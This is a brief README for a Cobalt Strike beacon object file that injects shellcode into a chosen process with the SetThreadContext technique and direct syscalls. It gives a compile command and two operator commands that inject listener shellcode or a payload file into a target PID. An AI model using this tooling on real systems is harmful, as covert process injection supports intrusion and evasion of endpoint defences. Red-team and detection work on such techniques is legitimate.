# Direct Syscall SetThreadContext Inject 

This is based on XPN's SetThreadContext technique as a beacon object file and using direct syscalls.

# Compile
`x86_64-w64-mingw32-gcc -c syscall_stcinject.c -o syscall_stcinject.o -masm=intel`

# Usage

NOTE: Currently only for x64

Load the CNA script in Cobalt Strike, then the following command will be included:

`syscall_stc_inject PID Listener` - Inject shellcode created for listener to target PID

`syscall_stc_shinject PID /path/to/payload.bin` - Inject payload.bin file to target PID
